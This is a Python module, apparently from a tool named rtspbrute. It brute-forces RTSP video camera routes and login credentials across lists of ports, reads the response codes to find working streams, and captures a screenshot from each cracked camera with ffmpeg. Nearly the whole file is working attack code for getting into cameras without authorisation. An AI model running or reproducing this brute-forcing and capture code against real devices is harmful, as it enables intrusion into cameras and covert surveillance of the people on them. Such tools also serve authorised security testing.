import logging
import subprocess
from pathlib import Path
from typing import List, Union

from rtspbrute.modules.cli.output import console
from rtspbrute.modules.rtsp import RTSPClient, Status
from rtspbrute.modules.utils import escape_chars

ROUTES: List[str]
CREDENTIALS: List[str]
PORTS: List[int]
PICS_FOLDER: Path

DUMMY_ROUTE = "/0x8b6c42"

# 401, 403: credentials are wrong but the route might be okay.
# 404: route is incorrect but the credentials might be okay.
# 200: stream is accessed successfully.
ROUTE_OK_CODES = [
    "RTSP/1.0 200",
    "RTSP/1.0 401",
    "RTSP/1.0 403",
    "RTSP/2.0 200",
    "RTSP/2.0 401",
    "RTSP/2.0 403",
]
CREDENTIALS_OK_CODES = ["RTSP/1.0 200", "RTSP/1.0 404", "RTSP/2.0 200", "RTSP/2.0 404"]

logger = logging.getLogger()
logger_is_enabled = logger.isEnabledFor(logging.DEBUG)


def attack(target: RTSPClient, port=None, route=None, credentials=None):
    if port is None:
        port = target.port
    if route is None:
        route = target.route
    if credentials is None:
        credentials = target.credentials

    # Create socket connection.
    connected = target.connect(port)
    if not connected:
        if logger_is_enabled:
            exc_info = (
                target.last_error if target.status is Status.UNIDENTIFIED else None
            )
            logger.debug(f"Failed to connect {target}:", exc_info=exc_info)
        return False

    # Try to authorize: create describe packet and send it.
    authorized = target.authorize(port, route, credentials)
    if logger_is_enabled:
        request = "\n\t".join(target.packet.split("\r\n")).rstrip()
        if target.data:
            response = "\n\t".join(target.data.split("\r\n")).rstrip()
        else:
            response = ""
        logger.debug(f"\nSent:\n\t{request}\nReceived:\n\t{response}")
    if not authorized:
        if logger_is_enabled:
            attack_url = RTSPClient.get_rtsp_url(target.ip, port, credentials, route)
            exc_info = (
                target.last_error if target.status is Status.UNIDENTIFIED else None
            )
            logger.debug(f"Failed to authorize {attack_url}", exc_info=exc_info)
        return False

    return True


def attack_route(target: RTSPClient):
    # If the stream responds positively to the dummy route, it means
    # it doesn't require (or respect the RFC) a route and the attack
    # can be skipped.
    for port in PORTS:
        ok = attack(target, port=port, route=DUMMY_ROUTE)
        if ok and any(code in target.data for code in ROUTE_OK_CODES):
            target.port = port
            target.routes.append("/")
            return target

        # Otherwise, bruteforce the routes.
        for route in ROUTES:
            ok = attack(target, port=port, route=route)
            if not ok:
                break
            if any(code in target.data for code in ROUTE_OK_CODES):
                target.port = port
                target.routes.append(route)
                return target


def attack_credentials(target: RTSPClient):
    def _log_working_stream():
        console.print("Working stream at", target)
        if logger_is_enabled:
            logger.debug(
                f"Working stream at {target} with {target.auth_method.name} auth"
            )

    if target.is_authorized:
        _log_working_stream()
        return target

    # If stream responds positively to no credentials, it means
    # it doesn't require them and the attack can be skipped.
    ok = attack(target, credentials=":")
    if ok and any(code in target.data for code in CREDENTIALS_OK_CODES):
        _log_working_stream()
        return target

    # Otherwise, bruteforce the routes.
    for cred in CREDENTIALS:
        ok = attack(target, credentials=cred)
        if not ok:
            break
        if any(code in target.data for code in CREDENTIALS_OK_CODES):
            target.credentials = cred
            _log_working_stream()
            return target


def _is_video_stream(stream):
    return (
        stream.profile is not None
        and stream.start_time is not None
        and stream.codec_context.format is not None
    )


def get_screenshot(rtsp_url: str):
    try:
        file_name = escape_chars(f"{rtsp_url.lstrip('rtsp://')}.jpg")
        file_path = PICS_FOLDER / file_name
        
        # Use ffmpeg directly to capture a single frame
        cmd = [
            'ffmpeg',
            '-rtsp_transport', 'tcp',        # Use TCP for RTSP
            '-timeout', '10000000',          # Socket timeout in microseconds (10 seconds)
            '-stimeout', '10000000',         # Socket timeout in microseconds (10 seconds)
            '-i', rtsp_url,                  # Input URL
            '-frames:v', '1',                # Capture just one frame
            '-y',                            # Overwrite output file
            '-loglevel', 'error',            # Only show errors in logs
            '-timeout', '10',                # Overall timeout in seconds
            str(file_path)                   # Output file path
        ]
        
        # Run ffmpeg with timeout
        result = subprocess.run(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=15  # Process timeout in seconds (slightly longer than ffmpeg timeout)
        )
        
        # Check if the screenshot was created successfully
        if file_path.exists() and file_path.stat().st_size > 0:
            console.print(
                f"[bold]Captured screenshot for",
                f"[underline cyan]{rtsp_url}",
            )
            if logger_is_enabled:
                logger.debug(f"Captured screenshot for {rtsp_url}")
            return file_path
        else:
            if logger_is_enabled:
                stderr = result.stderr.decode('utf-8', errors='ignore')
                logger.debug(f"Failed to capture screenshot for {rtsp_url}: {stderr}")
            return None
            
    except subprocess.TimeoutExpired:
        if logger_is_enabled:
            logger.debug(f"Screenshot timed out for {rtsp_url}")
        console.print(
            f"[italic yellow]Screenshot timed out for [underline]{rtsp_url}[/underline]",
        )
        return None
    except (PermissionError, FileNotFoundError) as e:
        if logger_is_enabled:
            logger.debug(f"File error for {rtsp_url}: {repr(e)}")
        console.print(
            f"[italic red]File error for [underline]{rtsp_url}[/underline]: {str(e)}",
        )
        return None
    except Exception as e:
        if logger_is_enabled:
            logger.debug(f"get_screenshot failed with {rtsp_url}: {repr(e)}")
        return None
